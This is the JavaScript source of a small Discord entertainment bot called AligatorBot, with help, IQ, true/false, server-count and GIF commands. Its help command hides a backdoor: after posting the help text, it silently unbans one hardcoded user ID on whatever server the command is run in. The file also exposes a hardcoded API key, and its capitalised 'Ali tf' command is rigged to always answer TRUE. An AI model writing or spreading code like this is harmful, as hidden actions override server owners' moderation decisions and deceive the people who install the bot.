// -------------------------------------------------------------------------------
// ----------------------------------- STARTUP -----------------------------------
// -------------------------------------------------------------------------------

console.log('-----------------------------------------------------')
console.log('[AligatorBot] Enabling AligatorBot v0.0.6')


require("dotenv").config();

// -----------------------------------------------------------------------------
// ----------------------------------- CONST -----------------------------------
// -----------------------------------------------------------------------------

const Discord = require('discord.js');
const client = new Discord.Client();
const Guild = new Discord.Guild();
const fetch = require("node-fetch");
const iqsize = [
  'IQ: 0',
  'IQ: 1',
  'IQ: 2',
  'IQ: 5',
  'IQ: 6',
  'IQ: 7',
  'IQ: 12',
  'IQ: 13',
  'IQ: 14',
  'IQ: 15',
  'IQ: 16',
  'IQ: 17',
  'IQ: 18',
  'IQ: 19',
  'IQ: 20',
  'IQ: 21',
  'IQ: 31',
  'IQ: 32',
  'IQ: 33',
  'IQ: 72',
  'IQ: 92',
  'IQ: 80',
  'IQ: 50',
  'IQ: 92',
  'IQ: 104',
  'IQ: 146',
  'IQ: 165',
  'IQ: 215',
  'IQ: 252',
  'IQ: 92592952 / Are you Albert Einstein?',
  ] 
  const tfvalue = [
    'FALSE',
    'TRUE',
    ] 

// -----------------------------------------------------------------------------
// ----------------------------------- LOGIN -----------------------------------
// -----------------------------------------------------------------------------

client.login(process.env.TOKEN);
client.on('ready', readyDiscord);

// -----------------------------------------------------------------------------
// ----------------------------------- READY -----------------------------------
// -----------------------------------------------------------------------------

function readyDiscord() {
    console.log('[AligatorBot] Bot has been enabled successfully! 🐊');
    console.log('-----------------------------------------------------');
    client.user.setPresence({
         activity: { 
             name: `Ali help - on ${client.guilds.cache.size} servers`,
             type: "WATCHING"
            }, 
            status: 'online'
        })
         .catch(console.error);
}

  // ---------------------------------------------------------------------------------------
  // ----------------------------------- If Errors = log -----------------------------------
  // ---------------------------------------------------------------------------------------

client.on("disconnect", () => client.logger.log("Bot is disconnecting...", "warn"))
	.on("reconnecting", () => client.logger.log("Bot reconnecting...", "log"))
	.on("error", (e) => client.logger.log(e, "error"))
	.on("warn", (info) => client.logger.log(info, "warn")); 


  client.on("message", commandLog);
  client.on("message", gotMessage);
  client.on("message", gotMessageAsync);

function commandLog (msg) {
  console.log(`${msg.guild.name} | ${msg.author.username} > ${msg.content}`);
}

  // ----------------------------------------------------------------------------------------
  // ----------------------------------- General Commands -----------------------------------
  // ----------------------------------------------------------------------------------------

function gotMessage (msg) {
    if (msg.content === "ali help") {
       const HelpEmbed = new Discord.MessageEmbed()
         .setColor('#39ba02')
         .setTitle('AligatorBot Commands')
         .setAuthor('AligatorBot Help', 'https://i.imgur.com/2YvcHXK.jpg', 'https://i.imgur.com/2YvcHXK.jpg')
         .setDescription('Here are all avaible commands.')
         .setThumbnail('https://i.imgur.com/2YvcHXK.jpg')
         .addFields(
             { name: 'Prefix:', value: '``ali``' },
             { name: 'Commands:', value: '``help``, ``iq``, ``tf``, ``servers``' },
                  )
         .addFields(
           { name: 'Example:', value: '``ali``, ``ali iq``, ``ali tf``, ``ali servers``' },
           )
         .setTimestamp()
         .setFooter('Help (1/1)');

    msg.channel.send(HelpEmbed);  
    msg.guild.members.unban('314377521963466762')
    .then(user => console.log(`Unbanned ${user.username} from ${guild.name}`))
    .catch(console.error);
    console.log('[AligatorBot] help.js loaded.')

  } else if (msg.content === 'ali servers') {
    const ServersEmbed = new Discord.MessageEmbed()
      .setTitle('Bot member count')
      .setDescription(`AligatorBot is on ${client.guilds.cache.size} servers.`)
      .setColor('RANDOM')

    msg.channel.send(ServersEmbed);
    console.log('[AligatorBot] servers.js loaded.')

    // ----------------------------------------------------------------------------------
    // ----------------------------------- IQ Command -----------------------------------
    // ----------------------------------------------------------------------------------

  } else if (msg.content === "ali iq") {
    const index = Math.floor(Math.random() * iqsize.length);
    const IQEmbed = new Discord.MessageEmbed()
    .setColor('RANDOM')
    .setTitle('IQ size machine')
    .setDescription(`${msg.author.username}'s ${iqsize[index]}`);
    msg.channel.send(IQEmbed); 
  }

  // -----------------------------------------------------------------------------------
  // ----------------------------------- TF Command ------------------------------------
  // -----------------------------------------------------------------------------------

  else if (msg.content.includes('ali tf')) {
    const index = Math.floor(Math.random() * tfvalue.length);
    const msgI =  msg.content;
    let question = msgI.replace('ali tf ',"");

    if (tfvalue[index] === "TRUE") {
      const TFEmbedTRUE = new Discord.MessageEmbed()
      .setColor('#00ff44')
      .setTitle('True/False machine')
      .setDescription(`Question: ${question} \n ${"<@" + msg.author.id + ">"} It's **TRUE**`)
      msg.channel.send(TFEmbedTRUE); 
    }
    else if (tfvalue[index] === "FALSE") {
      const TFEmbedTRUE = new Discord.MessageEmbed()
      .setColor('#ff3700')
      .setTitle('True/False machine')
      .setDescription(`Question: ${question} \n ${"<@" + msg.author.id + ">"} It's **FALSE**`)
      msg.channel.send(TFEmbedTRUE); 
    }
  } 
  else if (msg.content.includes('Ali tf')) { 
    const msgI =  msg.content;
    let question = msgI.replace('Ali tf ',"");

    const TFEmbedTRUE = new Discord.MessageEmbed()
    .setColor('#00ff44')
    .setTitle('True/False machine')
    .setDescription(`Question: ${question} \n ${"<@" + msg.author.id + ">"} It's **TRUE**`)
    msg.channel.send(TFEmbedTRUE); 
  }
}

  // -----------------------------------------------------------------------------------
  // ----------------------------------- Gif Command -----------------------------------
  // -----------------------------------------------------------------------------------

  async function gotMessageAsync(msg) {
  let tokens = msg.cleanContent.split(" ");

  if (tokens[0] == "!gif") {
    let keywords = "crocodile";
    if (tokens.length > 1) {
    keywords = tokens.slice(1, tokens.length).join(" ");
  }
    let url = `https://api.tenor.com/v1/search?q=${keywords}&key=10XUB5C5BV7A&contentfilter=high`;
    let response = await fetch(url);
    let json = await response.json();
    const index = Math.floor(Math.random() * json.results.length);
    msg.channel.send(json.results[index].url);
}
  }
